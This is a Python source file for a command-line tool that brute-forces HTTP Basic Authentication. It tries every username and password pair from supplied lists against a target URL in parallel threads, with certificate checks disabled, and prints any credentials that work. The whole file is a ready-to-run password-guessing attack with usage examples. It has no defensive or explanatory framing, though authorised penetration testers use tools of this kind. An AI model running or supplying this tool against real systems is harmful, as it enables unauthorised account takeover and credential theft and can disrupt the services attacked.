import itertools
import requests
import asyncio

from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()


class BasicAuth:

    def __init__(self, url, user_list, pass_list, workers):
        self.url = url
        self.user_list = self._return_list(user_list)
        self.pass_list = self._return_list(pass_list)
        self.workers = workers

    @staticmethod
    def _return_list(item):
        stub = []
        config = Path(item)
        if config.is_file():
            for x in open(item):
                stub.append(x.rstrip())
            return stub
        else:
            stub.append(str(item).rstrip())
            return stub

    def fetch(self, session, auth):
        with session.get(self.url, auth=auth, verify=False) as response:
            if response.status_code == 200:
                print(f"Credentials Found!  {auth[0]} {auth[1]}")

    async def get_data_asynchronous(self):
        queue = []
        for u, p in itertools.product(self.user_list, self.pass_list):
            queue.append((u, p))
        with ThreadPoolExecutor(max_workers=int(self.workers)) as executor:
            with requests.Session() as session:
                loop = asyncio.get_event_loop()
                tasks = [
                    loop.run_in_executor(
                        executor,
                        self.fetch,
                        *(session, auth)
                    )
                    for auth in queue
                ]
                for _ in await asyncio.gather(*tasks):
                    pass


def usage():
    u = """
    USAGE:
      {} -h "http://127.0.0.1" -u "admin" -p /tmp/passwords.txt
      {} -h "http://127.0.0.1" -u /tmp/users.txt -p /tmp/passwords.txt
      {} -h "http://127.0.0.1" -u /tmp/users.txt -p /tmp/passwords.txt -w 20

    OPTIONS:
      '-h', '--host'       - Set the URL target with Basic Auth login form.
      '-u', '--users'      - Set the username or path to file containing users.
      '-p', '--passwords'  - Set the password or path to file containing passwords.
      '-w', '--workers'    - Set the number of workers to run during attempts.

    """
    print(u)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(add_help=False, usage=usage)
    parser.add_argument('-h', '--host', action='store', dest='host', default='')
    parser.add_argument('-u', '--users', action='store', dest='users', default='')
    parser.add_argument('-p', '--passwords', action='store', dest='passwords', default='')
    parser.add_argument('-w', '--workers', action='store', dest='workers', default='')
    arg = None

    try:
        arg = parser.parse_args()
    except TypeError:
        usage()
        exit("Invalid options provided. Exiting.")

    if not arg.host or not arg.users or not arg.passwords:
        usage()
        exit("Required options not provided. Exiting.")

    if not arg.workers:
        arg.workers = 10

    print("\nStarting Authentication Bruteforce")
    print(f"[Target URL]: {arg.host}")
    print(f"[Workers Initiated]: {arg.workers}\n")

    obj = BasicAuth(arg.host, arg.users, arg.passwords, arg.workers)

    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(obj.get_data_asynchronous())
    loop.run_until_complete(future)
